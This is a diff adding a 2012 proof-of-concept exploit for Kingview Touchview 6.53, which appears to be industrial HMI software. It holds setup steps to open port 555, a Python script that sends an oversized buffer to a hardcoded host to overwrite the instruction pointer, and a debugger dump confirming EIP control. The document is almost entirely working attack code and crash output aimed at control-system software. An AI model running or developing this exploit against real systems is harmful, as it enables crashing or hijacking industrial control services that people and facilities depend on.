@@ -1,0 +1,51 @@
+# Exploit Title: Kingview Touchview  EIP direct control
+# Date: June 24 2012
+# Exploit Author: Carlos Mario Penagos Hollmann
+# Vendor Homepage: www.kingview.com
+
+# Version: 6.53
+# Tested on: Windows SP 1
+# CVE :
+
+Open kingivew click on Make choose network configuration--->network
+parameter , then  go to the node type and choose Local is a Login Server,
+run the demo port 555 will be open.
+NOTE:
+This was already patched by the vendor silently.
+
+import os
+import socket
+import sys
+
+host ="10.0.2.15"
+port = 555
+
+exploit = ("\x90"*1024)
+exploit += ("A"*23976)
+exploit += ("B"*12500)
+exploit += ("D"*6250)
+exploit += ("E"*6002)
+exploit += ("\x44\x43\x42\x41")
+exploit += ("\x90"*256)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+s.send(exploit)
+data = s.recv(1024)
+print "  [+] Closing connection.."
+s.close()
+print "  [+] Done!"
+
+
+eax=7ffdf000 ebx=00000000 ecx=40000000 edx=00000008 esi=41424344
+edi=0012f6b4
+eip=41424344 esp=0012f650 ebp=0012f678 iopl=0         nv up ei pl nz na po
+nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000
+efl=00010202
+41424344 ??
+CALL TO STACK
+0x41424344
+USER32!GetDC+0x6d
+USER32!EnumDisplaySettingsA+0x27d
+USER32!EnumDisplaySettingsA+0xc9
+USER32!DefDlgProcA+0x22
